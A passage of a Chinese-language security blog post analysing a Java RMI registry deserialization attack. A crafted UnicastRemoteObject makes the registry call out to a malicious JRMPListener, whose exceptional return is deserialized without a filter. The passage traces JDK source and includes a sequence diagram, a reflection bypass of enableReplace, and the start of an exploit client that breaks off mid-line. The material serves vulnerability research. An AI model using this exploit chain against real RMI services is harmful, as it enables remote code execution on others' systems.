class="line"></span><br><span class="line">    <span class="keyword">return</span> server; <span class="comment">// 返回已创建的监听 socket（尚未进入 accept 循环）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>invoke</code> 方法中，检测声明方法的类，如果不为 <code>Object</code>，进入 <code>invokeRemoteMethod</code> 方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 处理对动态代理实例 proxy 的方法调用，并返回结果。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span><br><span class="line">    <span class="keyword">throws</span> Throwable</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 安全校验：传入的 proxy 必须是 JDK 动态代理类生成的实例</span></span><br><span class="line">    <span class="keyword">if</span> (! Proxy.isProxyClass(proxy.getClass())) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;not a proxy&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 防护：确保这个 proxy 绑定的 InvocationHandler 就是当前对象</span></span><br><span class="line">    <span class="keyword">if</span> (Proxy.getInvocationHandler(proxy) != <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;handler mismatch&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1) 如果调用的是 Object 类的方法（hashCode/equals/toString），</span></span><br><span class="line">    <span class="comment">//    转到专门的处理逻辑，避免把本地方法误当作远程调用。</span></span><br><span class="line">    <span class="keyword">if</span> (method.getDeclaringClass() == Object.class) &#123;</span><br><span class="line">        <span class="keyword">return</span> invokeObjectMethod(proxy, method, args);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 如果是 Object.finalize()（且无参），忽略之（不触发远程调用）。</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;finalize&quot;</span>.equals(method.getName()) &amp;&amp; method.getParameterCount() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// ignore</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 其余情况：按 RMI 规则走远程调用</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> invokeRemoteMethod(proxy, method, args); <span class="comment">// 👈</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>invokeRemoteMethod</code> 方法首先检测 <code>Proxy</code> 的是否实现 <code>Remote</code> 接口，这里是我们能控制的，因为在创建代理类的时候就需要指定实现的接口。</p>
<p>这里的 <code>ref</code> 被赋值为 <code>UnicastRef</code>，并且存有恶意服务端（这里我们的注册中心一端转变成客户端，而恶意监听的一端相当于服务端）的 <code>tcp</code> 信息，这里是我们在序列化数据的时候设置的。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 处理真正的远程方法调用。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Object <span class="title function_">invokeRemoteMethod</span><span class="params">(Object proxy,</span></span><br><span class="line"><span class="params">                                  Method method,</span></span><br><span class="line"><span class="params">                                  Object[] args)</span></span><br><span class="line">    <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 保护性校验：RMI 的动态代理必须实现 java.rmi.Remote</span></span><br><span class="line">        <span class="keyword">if</span> (!(proxy <span class="keyword">instanceof</span> Remote)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;proxy not Remote instance&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 📌 发起远程调用：把 proxy/method/args 以及“方法哈希”交给 RemoteRef</span></span><br><span class="line">        <span class="comment">// RemoteRef 一般是 UnicastRef/UnicastRef2，负责编组、网络发送与解组</span></span><br><span class="line">        <span class="keyword">return</span> ref.invoke((Remote) proxy, method, args, getMethodHash(method));</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>和之前一样，如果我们远端的恶意服务器返回一个异常（<code>TransportConstants.ExceptionalReturn</code>）返回类型，并且返回一个恶意反序列化对象，则会在 <code>StreamRemoteCall#executeCall</code> 接收返回结果时触发反序列化。<strong>并且这里全程没有设置反序列化过滤器。</strong></p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Remote obj,</span></span><br><span class="line"><span class="params">                     Method method,</span></span><br><span class="line"><span class="params">                     Object[] params,</span></span><br><span class="line"><span class="params">                     <span class="type">long</span> opnum)</span></span><br><span class="line">    <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">        call.executeCall();</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">executeCall</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">byte</span> returnType;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// read result header</span></span><br><span class="line">    <span class="type">DGCAckHandler</span> <span class="variable">ackHandler</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (out != <span class="literal">null</span>) &#123;</span><br><span class="line">            ackHandler = out.getDGCAckHandler();</span><br><span class="line">        &#125;</span><br><span class="line">        releaseOutputStream();</span><br><span class="line">        <span class="type">DataInputStream</span> <span class="variable">rd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(conn.getInputStream());</span><br><span class="line">        <span class="type">byte</span> <span class="variable">op</span> <span class="operator">=</span> rd.readByte();</span><br><span class="line">        <span class="keyword">if</span> (op != TransportConstants.Return) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Transport.transportLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">                Transport.transportLog.log(Log.BRIEF,</span><br><span class="line">                    <span class="string">&quot;transport return code invalid: &quot;</span> + op);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;Transport return code invalid&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        getInputStream();</span><br><span class="line">        returnType = in.readByte();</span><br><span class="line">        in.readID();        <span class="comment">// id for DGC acknowledgement</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnmarshalException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;Error unmarshaling return header&quot;</span>,</span><br><span class="line">                                     e);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (ackHandler != <span class="literal">null</span>) &#123;</span><br><span class="line">            ackHandler.release();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// read return value</span></span><br><span class="line">    <span class="keyword">switch</span> (returnType) &#123;</span><br><span class="line">    <span class="keyword">case</span> TransportConstants.NormalReturn:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> TransportConstants.ExceptionalReturn:</span><br><span class="line">        Object ex;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ex = in.readObject();  <span class="comment">// 🚨 接收恶意序列化对象</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;Error unmarshaling return&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<pre class="mermaid">sequenceDiagram
    autonumber

    %% ── 不同进程分组（带背景色） ──
    box rgb(230,242,255) 攻击者客户端（进程A）
      participant A as 攻击者客户端
    end

    box rgb(232,245,233) 注册中心（进程B）
      participant S as RegistryImpl_Skel / Skeleton
      participant OIS as ObjectInputStream
      participant T as TCPTransport / TCPEndpoint / StreamRemoteCall
    end

    box rgb(255,243,224) 恶意JRMPListener（进程C）
      participant L as JRMPListener
    end

    %% ── 攻击端准备 ──
    A->>A: 构造 payload = UnicastRemoteObject<br/>（ssf = Proxy[RMIServerSocketFactory, Remote]<br/>→ RemoteObjectInvocationHandler(ref=UnicastRef[LiveRef→TCPEndpoint(L)])）
    A->>S: 伪造 lookup(opnum=2, arg=payload)
    note right of A: 通过 ref.newCall(..., opnum=2)<br/>out = call.getOutputStream()<br/>**反射** set enableReplace=false<br/>out.writeObject(payload)

    %% ── 服务器端反序列化触发 reexport ──
    S->>OIS: getInputStream()
    S->>OIS: in.readObject() 反序列化 payload
    note right of OIS: UnicastRemoteObject.readObject → defaultReadObject →<br/>**reexport()**（依据恢复的 port/csf/ssf）

    %% ── reexport 导出并监听 → 触发 ssf 远调 ──
    S->>T: exportObject(...) → listen()
    T->>T: TCPEndpoint.newServerSocket()
    T->>L: ssf.createServerSocket(port)<br/>(经 Remote 动态代理 → JRMP 远程调用)

    alt 正常返回（NormalReturn） ✅
      L-->>T: 正常返回（ServerSocket 信息）
      T-->>S: 继续导出；无利用发生
    else 异常返回（ExceptionalReturn） ⚠️
      L-->>T: 返回异常 + 恶意对象（gadget）
      T->>T: StreamRemoteCall.executeCall() 读取返回头
      T->>T: in.readObject() 反序列化异常对象
      note over T: 此链路**未设置** ObjectInputFilter（不同于 DGC 的 leaseFilter）<br/>→ 可能触发 gadget 链 🧨
      T-->>S: 抛 UnexpectedException / UnmarshalException（事后）
    end

    S-->>A: lookup 抛异常（类型不匹配/Unexpected）<br/>但**副作用已发生**</pre>

<p>需要注意的是这里远程调用时 <code>writeObject</code> 序列化类的 <code>ObjectOutputStream</code> 实际上是 RMI 的 <code>sun.rmi.server.MarshalOutputStream</code>。</p>
<p>如果直接将我们构造的 <code>UnicastRemoteObject</code> 反序列化会有下面这个调用链：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">at sun.rmi.server.MarshalOutputStream.replaceObject(MarshalOutputStream.java:81)</span><br><span class="line">at java.io.ObjectOutputStream.writeObject0(ObjectOutputStream.java:1145)</span><br><span class="line">at java.io.ObjectOutputStream.writeObject(ObjectOutputStream.java:349)</span><br><span class="line">at org.example.RMIClient.lookupInject(RMIClient.java:63)</span><br></pre></td></tr></table></figure></div>

<p>在 <code>writeObject0</code> 中如果 <code>enableReplace</code> 为 <code>true</code> 则会调用 <code>replaceObject</code> 函数对我们要序列化的对象做转换：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 若开启了“流级替换”（由 ObjectOutputStream.enableReplaceObject(true) 打开）</span></span><br><span class="line"><span class="keyword">if</span> (enableReplace) &#123;</span><br><span class="line">    <span class="comment">// 让当前输出流有机会把对象“替换”为另一个对象</span></span><br><span class="line">    <span class="comment">// （RMI 的 MarshalOutputStream 会在这里把 Remote 实例替换成 stub）</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">rep</span> <span class="operator">=</span> replaceObject(obj); <span class="comment">// 👈</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果替换产生了“不同且非空”的新对象，</span></span><br><span class="line">    <span class="comment">// 则以新对象的 Class 重新查询其序列化描述符（ObjectStreamClass）</span></span><br><span class="line">    <span class="keyword">if</span> (rep != obj &amp;&amp; rep != <span class="literal">null</span>) &#123;</span><br><span class="line">        cl = rep.getClass();</span><br><span class="line">        desc = ObjectStreamClass.lookup(cl, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新待写出的对象为“替换后”的对象（允许为 null，后续流程会按 null 处理）</span></span><br><span class="line">    obj = rep;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>MarshalOutputStream</code> 在构造的时候默认会设置 <code>enableReplaceObject</code> 为 <code>true</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用指定的协议版本创建一个用于 RMI 编组的输出流。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">MarshalOutputStream</span><span class="params">(OutputStream out, <span class="type">int</span> protocolVersion)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">super</span>(out);                       <span class="comment">// 构造 ObjectOutputStream，会立即写出流头部（魔数/版本）</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.useProtocolVersion(protocolVersion);</span><br><span class="line">    <span class="comment">// 设定对象流协议版本（如 PROTOCOL_VERSION_1 / 2）。</span></span><br><span class="line">    <span class="comment">// 必须在第一次真正写对象之前调用；此处在构造后立即设置，符合要求。</span></span><br><span class="line">    <span class="comment">// 版本影响后续写法（是否使用 block data 等），用于兼容旧版 JRMP/RMI。</span></span><br><span class="line"></span><br><span class="line">    java.security.AccessController.doPrivileged(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">java</span>.security.PrivilegedAction&lt;Void&gt;() &#123;</span><br><span class="line">            <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="comment">// 开启“流级替换”功能，使 writeObject0(...) 会回调 replaceObject(...)</span></span><br><span class="line">                <span class="comment">// 注意：启用该功能需要 SerializablePermission(&quot;enableSubstitution&quot;) 权限，</span></span><br><span class="line">                <span class="comment">// 放在 doPrivileged 中，确保在有 SecurityManager 时也能成功开启。</span></span><br><span class="line">                enableReplaceObject(<span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>而在 <code>MarshalOutputStream#replaceObject</code> 中，如果我们反序列化的对象实现了 <code>Remote</code> 且对象本身还不是一个 <code>RemoteStub</code> 时会进行替换。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 检查是否有实现了 java.rmi.Remote 的对象需要被</span></span><br><span class="line"><span class="comment"> * 序列化为“代理对象（stub/proxy）”来按引用传递。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;deprecation&quot;)</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Object <span class="title function_">replaceObject</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 仅当传入对象实现了 Remote 且当前对象本身还不是一个 RemoteStub</span></span><br><span class="line">    <span class="comment">//（老式静态桩类）时，才考虑替换为 stub。</span></span><br><span class="line">    <span class="keyword">if</span> ((obj <span class="keyword">instanceof</span> Remote) &amp;&amp; !(obj <span class="keyword">instanceof</span> RemoteStub)) &#123;</span><br><span class="line">        <span class="comment">// 从 RMI 的对象表中查找该 Remote 实例对应的 Target（只有已 export 的才有）</span></span><br><span class="line">        <span class="type">Target</span> <span class="variable">target</span> <span class="operator">=</span> ObjectTable.getTarget((Remote) obj);</span><br><span class="line">        <span class="keyword">if</span> (target != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 若已导出，直接拿到其桩（可能是动态代理，也可能是旧的静态 stub）</span></span><br><span class="line">            <span class="keyword">return</span> target.getStub();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 否则不做替换，按原对象继续序列化流程</span></span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>由于 <code>UnicastRemoteObject</code> 实现了 <code>Remote</code>，没有实现 <code>RemoteStub</code>，于是会进入判断，就会替换我们的<code>obj</code>，以至于反序列化的时候不能还原我们构造的类。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/08/25/Java%20RMI%20&%20JNDI/images/UnicastRemoteObject.png"
                      alt="UnicastRemoteObject"
                ></p>
<p>解决方法是在 <code>writeObject</code> 序列化对象前设置 <code>enableReplace</code> 为 <code>false</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getOutputStream();</span><br><span class="line">setFieldValue(out, <span class="string">&quot;enableReplace&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">out.writeObject(obj);</span><br></pre></td></tr></table></figure></div>

<p>完整的 <code>RMIClient</code> 代码如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ↓↓↓ 以下为 JDK 内部 API；JDK 9+ 编译/运行需 --add-exports（见文末说明）</span></span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 通过“自造 RegistryImpl_Stub 调用”在 lookup(opnum=2) 的参数反序列化阶段</span></span><br><span class="line"><span class="comment"> * “注入任意对象”。即便随后类型检查失败（lookup 期望 String），反序列化副作用已发生。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 核心技巧：</span></span><br><span class="line"><span class="comment"> * 1) 使用 registry 的底层 RemoteRef 构造一次“手工”调用（newCall）。</span></span><br><span class="line"><span class="comment"> * 2) 在参数写出前，反射把 MarshalOutputStream 的 enableReplace 置为 false，</span></span><br><span class="line"><span class="comment"> *    避免 RMI 的流级替换把实现 Remote 的对象替换成 stub（否则无法还原 UnicastRemoteObject）。</span></span><br><span class="line"><span class="comment"> * 3) payload 选择一个 UnicastRemoteObject，其 ssf（RMIServerSocketFactory）被设置为</span></span><br><span class="line"><span class="comment"> *    远端代理（RemoteObjectInvocationHandler + UnicastRef 指向恶意 JRMPListener）。</span></span><br><span class="line"><span class="comment"> *    当目标 JVM 反序列化后 reexport() → listen() → newServerSocket() → ssf.createServerSocket(...)</span></span><br><span class="line"><span class="comment"> *    触发一次“出站远程调用”（到恶意 JRMP 服务），从而在对端反序列化返回异常路径中触发 gadget。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">regHost</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">regPort</span> <span class="operator">=</span> <span class="number">1099</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1) 获取 RMI 注册中心 stub</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(regHost, regPort);</span><br><span class="line">        System.out.println(<span class="string">&quot;[*] Connected to Registry &quot;</span> + regHost + <span class="string">&quot;:&quot;</span> 